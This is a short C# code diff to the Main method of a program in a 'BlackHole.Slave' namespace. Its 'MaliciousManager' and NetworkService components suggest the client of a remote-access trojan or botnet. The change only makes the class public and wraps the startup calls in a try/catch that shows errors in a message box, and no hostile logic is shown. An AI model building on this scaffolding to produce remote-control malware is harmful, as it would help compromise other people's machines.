@@ -11,20 +11,27 @@ using System.Windows.Forms;
 
 namespace BlackHole.Slave
 {
-    class Program
+    public class Program
     {
-        static void Main(string[] args)
+        public static void Main(string[] args)
         {
-            MaliciousManager.Instance.Initialize();
-            NetworkService.Instance.Initialize();
-
-            Kernel32.SetConsoleCtrlHandler((ctrl) =>
+            try
             {
-                NetworkService.Instance.FireShutdown((int)ctrl);
-                Thread.Sleep(500);
-                return true;
-            }, true);
-            Application.Run();
+                MaliciousManager.Instance.Initialize();
+                NetworkService.Instance.Initialize();
+
+                Kernel32.SetConsoleCtrlHandler((ctrl) =>
+                {
+                    NetworkService.Instance.FireShutdown((int)ctrl);
+                    Thread.Sleep(500);
+                    return true;
+                }, true);
+                Application.Run();
+            }
+            catch(Exception e)
+            {
+                MessageBox.Show(e.ToString());
+            }
         }
     }
 }
